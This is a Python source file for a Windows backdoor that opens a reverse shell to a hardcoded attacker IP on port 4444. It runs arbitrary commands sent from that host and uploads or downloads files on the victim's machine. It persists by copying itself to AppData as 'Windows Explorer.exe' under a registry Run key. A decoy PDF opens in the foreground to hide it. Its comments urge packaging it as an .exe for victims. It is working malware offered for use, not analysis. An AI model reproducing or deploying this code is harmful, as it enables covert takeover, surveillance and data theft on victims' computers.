# The given should be repackeged into a .exe file to run without any support on the target's computer, even if the target does not have any Python Interpretor installed.
# The given Py code when executed on the Victim's machine, can execute any Windows command from the command prompt, and even has...
# ... "UPLOAD" and "DOWNLOAD" functionality, ie, you can inject files into the victim's system, and can even download from theirs.

import os
import socket
import subprocess
import simplejson
import base64
import shutil
import sys


class Backdoor:
    def __init__(self, ip_hacker, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip_hacker, port))

    def become_persistent(self): # This is a Persistance code, i.e, even if the target restarts their machine, the code will still get executed on start=up, and a connection can be made between the Target and the Hacker's machine, given that the "Listener" code is working.
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe" # the executed code gets saved as "Windows Explorer", so that even if the target knows that something is fishy, they won't be able to find out what, because a lot programs use simmilar names in Task Manager.
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True) 

    def reliable_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b" "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[!] Changing Current Working Directory to {}".format(path)

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[=]Upload Successful."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[x_x] Error during Command Execution."
            self.reliable_send(command_result)

file_name = sys._MEIPASS + "\Cheatcode_DSA_GFG.pdf" # This is the foreground file that will open in the front while the code will execute in the background.
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("192.192.92.5", 4444) # Input the hacker's IP address here, I am using PORT#4444 for TCP connection but that be altered. Note it to make sure that you change it in the listener too.
    my_backdoor.run()
except Exception:
    sys.exit()
